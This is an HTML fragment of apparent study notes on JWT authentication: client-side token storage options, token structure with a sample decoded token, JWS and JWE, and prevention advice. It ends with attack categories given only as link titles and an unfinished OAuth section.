            </h2>
            <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
          </div>

          <div class="section__text" style="background: rgba(115, 128, 206, 0.05); box-shadow: inset 0 2px 10px rgba(0,0,0,0.02); padding: 30px 25px 30px 45px; border-left: 5px solid #7380ce; border-radius: 0 12px 12px 0; margin-top: 15px;">
            <article class="section">
              <div class="section__title">
                <h2 class="section__title__text">
                  JWT Authentication
                </h2>
                <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
              </div>

              <div class="section__text">
                <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
                  <div style="padding: 40px 6%;">
                    <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>JWT &rarr; JSON Web Token</strong></p>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;"><em>(Stateless authentication)</em></p>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; As JWTs are most commonly used in authentication, session management, and access control mechanisms, these vulnerabilities can potentially compromise the entire website and its users.</p>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-bottom: 20px;">&rarr; What are JWT ? &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Standardized format for sending cryptographically signed JSON data between systems.</li>
                      <li style="margin-bottom: 10px;">They can theoretically contain any kind of data, but are most commonly used to send information ("claims") about users as part of authentication, session handling, and access control mechanisms.</li>
                      <li style="margin-bottom: 10px;"><strong>Claims in JSON Web Tokens (JWTs) are key-value pairs in the payload section of the token.</strong></li>
                      <li style="margin-bottom: 10px;"><strong>These claims carry information about the user, session, or other relevant data and are used by the application or service to process the token.</strong></li>
                      <li style="margin-bottom: 10px;">Unlike with classic session tokens, all of the data that a server needs is stored client-side within the JWT itself.</li>
                      <li style="margin-bottom: 10px;">app generate JWT and send it to client in <strong>cookie or response body</strong> and client store it in Cookie (best practice) or in storage (local storage, session storage) Ã¢â‚¬Â¦.</li>
                      <li style="margin-bottom: 10px;">can use token and send it to server using <strong><code>cookie</code></strong> or <strong><code>Authorization</code></strong> header with <strong><code>Bearer</code></strong></li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">&rarr; How Client Send Token to application ?</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>Use the Authorization Header:</strong> Preferred for most scenarios, especially for RESTful APIs.</li>
                      <li style="margin-bottom: 10px;"><strong>Avoid Query Parameters:</strong> Only use when absolutely necessary.</li>
                      <li style="margin-bottom: 10px;"><strong>Secure Tokens in Cookies:</strong> If cookies are used, configure them with HttpOnly, Secure, and SameSite attributes.</li>
                      <li style="margin-bottom: 10px;"><strong>Encrypt Data in Transit:</strong> Always use HTTPS to protect tokens regardless of placement.</li>
                      <li style="margin-bottom: 10px;"><strong>Minimize Token Exposure:</strong> Avoid placing tokens in locations where they can be easily accessed, logged, or cached.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">&rarr; Registered Claims &rarr;</h3>
                    <div style="overflow-x: auto; margin-bottom: 20px;">
                      <table style="width: 100%; border-collapse: collapse; font-size: 1.2rem; text-align: left; background-color: var(--color-white, #f3f4f6); box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); border-radius: 8px; overflow: hidden;">
                        <thead style="background-color: #2563eb; color: #ffffff;">
                          <tr>
                            <th style="padding: 15px; border-bottom: 2px solid #e5e7eb;">Claim</th>
                            <th style="padding: 15px; border-bottom: 2px solid #e5e7eb;">Description</th>
                          </tr>
                        </thead>
                        <tbody>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><strong>iss (Issuer)</strong></td>
                            <td style="padding: 15px;">Identifies who issued the token (e.g., a server or authentication service).</td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><strong>sub (Subject)</strong></td>
                            <td style="padding: 15px;">Identifies the subject of the token, often a user ID.</td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><strong>aud (Audience)</strong></td>
                            <td style="padding: 15px;">Indicates the intended recipient(s) of the token (e.g., a specific API).</td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><strong>exp (Expiration Time)</strong></td>
                            <td style="padding: 15px;">Specifies when the token expires (in Unix timestamp format).</td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><strong>iat (Issued At)</strong></td>
                            <td style="padding: 15px;">Indicates when the token was created (in Unix timestamp format).</td>
                          </tr>
                          <tr>
                            <td style="padding: 15px;"><strong>nbf (Not Before)</strong></td>
                            <td style="padding: 15px;">Specifies when the token becomes valid.</td>
                          </tr>
                        </tbody>
                      </table>
                    </div>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Where store Token in Client ? &rarr;</h2>
                    
                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">1 &rarr; Cookies &rarr;</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; put flags ( secure, HTTP only, samesite )</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Not accessible by JavaScript &rarr; protected from <strong>XSS</strong></li>
                      <li style="margin-bottom: 10px;">Automatically sent with every request</li>
                      <li style="margin-bottom: 10px;">Works naturally with browsers</li>
                      <li style="margin-bottom: 10px;">Supports CSRF protection via SameSite</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold; color: #dc2626;">&rarr; Cons &rarr;</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Complexity: working with cookies can be more complex compared to LocalStorage.</li>
                      <li style="margin-bottom: 10px;">Limited Storage: cookies have a size limit of approximately 4KB, which may pose a constraint when storing large JWT tokens.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">2 &rarr; Local Storage &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">built-in browser storage mechanism that allows web applications to store data persistently.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold; color: #16a34a;">&rarr; Pros &rarr;</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Simplicity: The <code>LocalStorage</code> API is straightforward to use, making implementation easier.</li>
                      <li style="margin-bottom: 10px;">Persistence: Data stored in <code>LocalStorage</code> remains available even after the user closes the browser or reboots the system.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold; color: #dc2626;">&rarr; Cons &rarr;</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">XSS attack: storing JSON web tokens in <code>LocalStorage</code> makes them susceptible to a XSS attack.</li>
                      <li style="margin-bottom: 10px;">Lack of Encryption: LocalStorage does not provide built-in encryption, encrypted tokens make the stored data virtually inaccessible if an attacker gains access to the user's device.</li>
                    </ul>

                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">&rarr; Best Practices for securely storing JSON web tokens &rarr;</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>Encryption:</strong> If you choose to use LocalStorage, encrypt the JWT tokens before storing them to enhance their security. Various encryption libraries and algorithms are available for this purpose.</li>
                      <li style="margin-bottom: 10px;"><strong>Short validity:</strong> Set a short lifespan for JWT tokens to minimize the window of opportunity for attackers to exploit stolen tokens.</li>
                      <li style="margin-bottom: 10px;"><strong>Refresh token:</strong> a mechanism that utilizes simple web tokens to refresh tokens and reject tokens that have expired will help to protect your user's data and minimize the chances of data theft.</li>
                      <li style="margin-bottom: 10px;"><strong><code>Secure</code> and <code>HttpOnly</code> flags</strong></li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">3 &rarr; Session Storage &rarr;</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold; color: #16a34a;">Pros</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Cleared when tab closes</li>
                      <li style="margin-bottom: 10px;">Slightly safer than LocalStorage</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold; color: #dc2626;">Cons</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Still XSS-vulnerable</li>
                      <li style="margin-bottom: 10px;">Lost on tab close</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">4 &rarr; Browser Memory &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The token exists <strong>only in JavaScript runtime memory</strong> (variables, application state, closures, Redux store, etc.)</li>
                      <li style="margin-bottom: 10px;">It is <strong>never written to disk</strong> and <strong>never persisted</strong> in the browser.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">Destroyed when &rarr;</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The page reloads</li>
                      <li style="margin-bottom: 10px;">The tab closes</li>
                      <li style="margin-bottom: 10px;">The browser crashes</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; Storing the access token in <strong>browser memory</strong> is more secure <strong>not because it blocks XSS</strong> but because it <strong>limits the damage when XSS happens</strong></p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">It <strong>expires in minutes</strong></li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">5 &rarr; Hybrid method &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Access Token in Memory + Refresh Token in HTTP-Only Cookie</li>
                      <li style="margin-bottom: 10px;">Access token &rarr; <strong>fast, short-lived, low-risk</strong></li>
                      <li style="margin-bottom: 10px;">Refresh token &rarr; <strong>secure, long-lived, never exposed to JavaScript</strong></li>
                      <li style="margin-bottom: 10px;">This is the architecture used by high-security production systems.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;"><a href="https://www.notion.so/Flow" target="_blank" style="color: #2563eb;">Flow Details</a></p>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">&rarr; Session management with JWT &rarr;</h3>
                    <ol style="font-size: 1.2rem; padding-left: 30px;">
                      <li style="margin-bottom: 10px;">User logs in</li>
                      <li style="margin-bottom: 10px;">Server creates a <strong>JWT containing user identity and permissions</strong></li>
                      <li style="margin-bottom: 10px;">Server signs the JWT and sends it to the browser</li>
                      <li style="margin-bottom: 10px;">Browser stores the JWT (usually in cookie or localStorage)</li>
                      <li style="margin-bottom: 10px;">On every request:
                        <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                          <li>Browser sends the JWT</li>
                          <li>Server <strong>verifies the signature</strong></li>
                          <li>Server reads user info directly from the token</li>
                          <li><strong>No session lookup needed</strong></li>
                        </ul>
                      </li>
                    </ol>
                    <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #eab308; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                      <p style="font-size: 1.2rem; margin: 0;">So with JWT: <strong>The session state lives inside the token on the client, not on the server.</strong></p>
                    </div>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; JWT format &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">A JWT consists of 3 parts &rarr; <strong>a header, a payload, and a signature.</strong></li>
                      <li style="margin-bottom: 10px;">These are each separated by a dot.</li>
                    </ul>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto; word-break: break-all;">eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA</code>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>&rarr; The header and payload parts of a JWT are just base64url-encoded JSON objects.</strong></p>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; The header contains metadata about the token itself, while the payload contains the actual "claims" about the user.</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">Header:
{
  "alg": "HS256",
  "typ": "JWT"
}

Payload:
{
    "iss": "portswigger",
    "exp": 1648037164,
    "name": "Carlos Montoya",
    "sub": "carlos",
    "role": "blog_author",
    "email": "carlos@carlos-montoya.net",
    "iat": 1516239022
}</code>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; In most cases, this data can be easily read or modified by anyone with access to the token. Therefore, the security of any JWT-based mechanism is heavily reliant on the cryptographic signature.</p>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">&rarr; JWT signature &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The server that issues the token typically generates the signature by hashing the header and payload.</li>
                      <li style="margin-bottom: 10px;">In some cases, they also encrypt the resulting hash. Either way, this process involves a secret signing key.</li>
                      <li style="margin-bottom: 10px;">The signature is the part of the token that provides a method for verifying the token's authenticity. The signature is created by using the algorithm specified in the header of the JWT.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>&rarr; This mechanism provides a way for servers to verify that none of the data within the token has been tampered with since it was issued &rarr;</strong></p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">As the signature is directly derived from the rest of the token, changing a single byte of the header or payload results in a mismatched signature.</li>
                      <li style="margin-bottom: 10px;">Without knowing the server's secret signing key, it shouldn't be possible to generate the correct signature for a given header or payload.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; JWT vs JWS vs JWE &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The JWT specification is actually very limited.</li>
                      <li style="margin-bottom: 10px;">It only defines a format for representing information ("claims") as a JSON object that can be transferred between two parties.</li>
                      <li style="margin-bottom: 10px;">In practice, JWTs aren't really used as a standalone entity. The JWT spec is extended by both the JSON Web Signature (JWS) and JSON Web Encryption (JWE) specifications, which define concrete ways of actually implementing JWTs.</li>
                      <li style="margin-bottom: 10px;">In other words, a JWT is usually either a JWS or JWE token. When people use the term "JWT", they almost always mean a JWS token. JWEs are very similar, except that the actual contents of the token are encrypted rather than just encoded.</li>
                    </ul>
                    <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #eab308; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                      <p style="font-size: 1.2rem; margin: 0;"><strong>JWT defines the token format. JWS applies cryptographic signatures to provide integrity and authenticity, while JWE encrypts the JWT to provide confidentiality in addition to integrity and authenticity.</strong></p>
                    </div>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; What are JWT attacks? &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Send modified JWT to server to achieve malicious goal Ã¢â‚¬Â¦</li>
                      <li style="margin-bottom: 10px;">this goal is to bypass authentication and access controls by impersonating another user who has already been authenticated.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; What is the impact of JWT attacks? &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The impact of JWT attacks is usually severe.</li>
                      <li style="margin-bottom: 10px;">If an attacker is able to create their own valid tokens with arbitrary values, they may be able to escalate their own privileges or impersonate other users, taking full control of their accounts.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; How do vulnerabilities to JWT attacks arise? &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The application <strong>fails to properly verify the JWT signature</strong>, allowing attackers to modify the tokenÃ¢â‚¬â„¢s payload.</li>
                      <li style="margin-bottom: 10px;">The serverÃ¢â‚¬â„¢s <strong>secret key is weak, leaked, guessed, or brute-forced</strong>, enabling attackers to generate valid tokens.</li>
                      <li style="margin-bottom: 10px;">Developers misconfigure JWT handling due to the flexibility of the JWT specification.</li>
                    </ul>
                    <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #eab308; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                      <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc; margin: 0;">
                        <li style="margin-bottom: 10px;">JWT vulnerabilities typically arise due to flawed JWT handling within the application itself.</li>
                        <li style="margin-bottom: 10px;">The various specifications related to JWTs are relatively flexible by design, allowing website developers to decide many implementation details for themselves.</li>
                        <li style="margin-bottom: 10px;">This can result in them accidentally introducing vulnerabilities even when using battle-hardened libraries.</li>
                      </ul>
                    </div>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; How to prevent JWT attacks? &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Use an up-to-date library for handling JWTs and make sure your developers fully understand how it works, along with any security implications.</li>
                      <li style="margin-bottom: 10px;">Make sure that you perform robust signature verification on any JWTs that you receive, and account for edge-cases such as JWTs signed using unexpected algorithms.</li>
                      <li style="margin-bottom: 10px;">Enforce a strict whitelist of permitted hosts for the <code>jku</code> header.</li>
                      <li style="margin-bottom: 10px;">Make sure that you're not vulnerable to path traversal or SQL injection via the <code>kid</code> header parameter.</li>
                      <li style="margin-bottom: 10px;">Always set an expiration date for any tokens that you issue.</li>
                      <li style="margin-bottom: 10px;">Avoid sending tokens in URL parameters where possible.</li>
                      <li style="margin-bottom: 10px;">Include the <code>aud</code> (audience) claim (or similar) to specify the intended recipient of the token. This prevents it from being used on different websites.</li>
                      <li style="margin-bottom: 10px;">Enable the issuing server to revoke tokens (on logout, for example).</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Attacks &rarr;</h2>
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-bottom: 40px;">
                      <a href="https://www.notion.so/1-Exploiting-flawed-JWT-signature-verification" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">1 &rarr; Flawed verification <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/2-Brute-forcing-secret-keys" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">2 &rarr; Brute-forcing <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/3-JWT-header-parameter-injections" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">3 &rarr; Parameter injections <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/4-Algorithm-confusion-attacks" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">4 &rarr; Algorithm confusion <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/5-Sensitive-Information-Disclosure" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">5 &rarr; Info Disclosure <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/6-Token-Lifetime" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">6 &rarr; Token Lifetime <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/7-Cross-Service-Relay-Attacks" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">7 &rarr; Relay Attacks <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                    </div>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Resources &rarr;</h2>
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-bottom: 40px;">
                      <a href="https://www.notion.so/Writeups" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Writeups <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Notes" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Notes <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                    </div>

                  </div>
                </div>
              </div>
            </article>

            <article class="section">
              <div class="section__title">
                <h2 class="section__title__text">
                  OAuth
                </h2>
                <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
              </div>

              <div class="section__text">
                <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
                  <div style="padding: 40px 6%;">
                    <p style="font-size: 1.2rem; margin-bottom: 20px;"><em>Open Authorization</em></p>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-bottom: 20px;">&rarr; Basics &rarr;</h2>
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-bottom: 40px;">
                      <a href="https://www.notion.so/What-is-OAuth-2-0" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">What is OAuth 2.0 <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/How-it-work" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">How it works <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/OAuth-Authentication" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">OAuth Authentication <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/OpenID-Connect" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">OpenID Connect <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                    </div>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Attacks &rarr;</h2>
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-bottom: 40px;">
